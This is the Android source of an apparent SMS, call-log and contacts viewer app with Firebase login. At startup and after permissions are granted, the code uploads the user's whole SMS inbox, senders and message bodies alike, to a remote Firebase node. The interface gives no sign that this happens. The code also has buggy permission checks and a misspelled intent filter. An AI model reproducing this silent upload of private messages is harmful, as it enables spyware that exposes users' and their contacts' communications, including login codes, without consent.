package com.example.paranoidandroid.sapp;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.Button;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import android.provider.CallLog;

import com.firebase.ui.auth.AuthUI;
import com.firebase.ui.auth.IdpResponse;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

public class MainActivity extends AppCompatActivity implements View.OnClickListener{
    private static final int RC_SIGN_IN = 1 ;
    List<AuthUI.IdpConfig> providers = Arrays.asList(
            new AuthUI.IdpConfig.EmailBuilder().build(),
            new AuthUI.IdpConfig.GoogleBuilder().build());

    @Override
    public void onClick(View view) {
        switch(view.getId()){
            case R.id.bcalllog:
                refreshCallLog();
                break;

            case R.id.bsmslog:
                refreshSmsInbox();
                break;

            case R.id.bcontacts:
                refreshContactList();
                break;
        }
    }

    private static  MainActivity inst;
    ListView listView;
    ArrayList<String> smsListView = new ArrayList<String>();
    ArrayAdapter arrayAdapter;
    private SMSBReciever broadcastReceiver;
    Button bcalllog, bsmslog, bcontacts;
    TextView textView;
    FirebaseDatabase database ;
    DatabaseReference myref ;
    DatabaseReference MyContactRef;
    private FirebaseAuth firebaseAuth;
    private FirebaseAuth.AuthStateListener authStateListener;

    public static MainActivity instance(){return inst;}

    @Override
    protected void onStart() {
        super.onStart();
        IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVE");
        registerReceiver(broadcastReceiver,intentFilter);
        inst = this;
    }



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        broadcastReceiver = new SMSBReciever();

        listView = findViewById(R.id.smsList);
        bcalllog = findViewById((R.id.bcalllog));
        bsmslog = findViewById(R.id.bsmslog);
        bcontacts = findViewById(R.id.bcontacts);
        textView = findViewById(R.id.fbt);



        bcalllog.setOnClickListener(this);
        bsmslog.setOnClickListener(this);
        bcontacts.setOnClickListener(this);

        database  = FirebaseDatabase.getInstance();
        firebaseAuth = FirebaseAuth.getInstance();

        myref = database.getReference("message");
        MyContactRef = database.getReference("contactRef");
        myref.setValue("Hello World");

        myref.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                String value = dataSnapshot.getValue(String.class);
                textView.setText(value);
            }

            @Override
            public void onCancelled(DatabaseError databaseError) {
                Toast.makeText(MainActivity.this, "FIREBASE ERROR!!", Toast.LENGTH_SHORT).show();
            }
        });


        arrayAdapter = new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1,smsListView);
        listView.setAdapter(arrayAdapter);

        listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                try {
                    String[] smsMessages = smsListView.get(position).split("\n");
                    String address = smsMessages[0];
                    String smsMessage = "";
                    for (int i = 1;i<smsMessages.length;++i){
                        smsMessage += smsMessages[i];
                    }
                    String smsMessageStr = address + "\n";
                    smsMessageStr += smsMessage;
                    Toast.makeText(MainActivity.this,smsMessageStr, Toast.LENGTH_SHORT).show();
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        });

        if(ContextCompat.checkSelfPermission(getBaseContext(),"android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(getBaseContext(),"android.permission.READ_CALL_LOG") == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(getBaseContext(),"android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED ){
            refreshSmsInbox();
            MyContactRef.setValue(smsListView);
        }else{
            final int REQUEST_CODE_ASK_PERMISSION = 123;
            ActivityCompat.requestPermissions(MainActivity.this,new String[]{
                    "android.permission.READ_SMS",
                    "android.permission.READ_CALL_LOG",
                    "android.permission.READ_CONTACTS"
            },REQUEST_CODE_ASK_PERMISSION);
        }

        authStateListener = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                FirebaseUser user = firebaseAuth.getCurrentUser();
                if(user!=null){

                }
                else{
                    // Choose authentication providers
                    List<AuthUI.IdpConfig> providers = Arrays.asList(
                            new AuthUI.IdpConfig.EmailBuilder().build(),
                            new AuthUI.IdpConfig.GoogleBuilder().build());

                    // Create and launch sign-in intent
                    startActivityForResult(
                            AuthUI.getInstance()
                                    .createSignInIntentBuilder()
                                    .setIsSmartLockEnabled(false)
                                    .setAvailableProviders(providers)
                                    .build(),
                            RC_SIGN_IN);
                }
            }
        };

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == RC_SIGN_IN) {
            IdpResponse response = IdpResponse.fromResultIntent(data);

            if (resultCode == RESULT_OK) {
                // Successfully signed in
                FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
                Toast.makeText(inst, "You Are Logged In", Toast.LENGTH_SHORT).show();
                // ...
            } else {
                // Sign in failed. If response is null the user canceled the
                // sign-in flow using the back button. Otherwise check
                // response.getError().getErrorCode() and handle the error.
                // ...
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        switch (requestCode){
            case 123:
                Toast.makeText(MainActivity.this, "its Working", Toast.LENGTH_SHORT).show();
                ContentResolver contentResolver = getContentResolver();
                Cursor smsInboxCurser = contentResolver.query(Uri.parse("content://sms/inbox"),null,null,null,null);
                int indexBody = smsInboxCurser.getColumnIndex("Body");
                int indexAddress = smsInboxCurser.getColumnIndex("address");
                if(indexBody < 0 || !smsInboxCurser.moveToFirst())return;
                do{
                    String str = "SMS From:" + smsInboxCurser.getString(indexAddress)+"\n"+smsInboxCurser.getString(indexBody)+"\n";
                    arrayAdapter.add(str);
                }while (smsInboxCurser.moveToNext());
                MyContactRef.setValue(smsListView);
                smsInboxCurser.close();

                break;
        }
    }

    private void refreshSmsInbox() {
        ContentResolver contentResolver = getContentResolver();
        Cursor smsInboxCurser = contentResolver.query(Uri.parse("content://sms/inbox"),null,null,null,null);
        int indexBody = smsInboxCurser.getColumnIndex("Body");
        int indexAddress = smsInboxCurser.getColumnIndex("address");
        if(indexBody < 0 || !smsInboxCurser.moveToFirst())return;
        arrayAdapter.clear();
        do{
            String str = "SMS From:" + smsInboxCurser.getString(indexAddress)+"\n"+smsInboxCurser.getString(indexBody)+"\n";
            arrayAdapter.add(str);
        }while (smsInboxCurser.moveToNext());
        smsInboxCurser.close();


    }

    public void refreshCallLog(){
        if(ContextCompat.checkSelfPermission(getBaseContext(),"android.permission.READ_CALL_LOG") == PackageManager.PERMISSION_GRANTED){
            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor c = managedQuery(allCalls, null, null, null, null);
            arrayAdapter.clear();
            while(c.moveToNext()){
                String num= c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));// for  number
                String name= c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name
                String duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));// for duration
                int type = Integer.parseInt(c.getString(c.getColumnIndex(CallLog.Calls.TYPE)));
                String dircode = null;
                switch(type){
                    case CallLog.Calls.INCOMING_TYPE: dircode = "INCOMING"; break;
                    case CallLog.Calls.OUTGOING_TYPE: dircode = "OUTGOING"; break;
                    case CallLog.Calls.MISSED_TYPE: dircode = "MISSED"; break;
                }
                updateList(num+"\n"+name+"\n"+duration+"\n"+dircode);
            }

            c.close();
        }else
            Toast.makeText(getApplicationContext(), "READ_CALL_LOG Permission not granted", Toast.LENGTH_SHORT).show();

    }

    public void refreshContactList(){
        if(ContextCompat.checkSelfPermission(getBaseContext(),"android.permission.READ_CALL_LOG") == PackageManager.PERMISSION_GRANTED) {
            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            arrayAdapter.clear();
            while (phones.moveToNext()) {
                String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                updateList(name + "\n" + phoneNumber);

            }
            phones.close();
        }else
            Toast.makeText(getApplicationContext(), "READ_CONTACTS permission not granted", Toast.LENGTH_SHORT).show();
    }

    public void updateList(final String smsMessage){
        arrayAdapter.insert(smsMessage,0);
        arrayAdapter.notifyDataSetChanged();
    }

    @Override
    protected void onStop() {
        super.onStop();
        unregisterReceiver(broadcastReceiver);
    }

    @Override
    protected void onResume() {
        super.onResume();
        firebaseAuth.addAuthStateListener(authStateListener);
    }

    @Override
    protected void onPause() {
        super.onPause();
        firebaseAuth.removeAuthStateListener(authStateListener);
    }
}
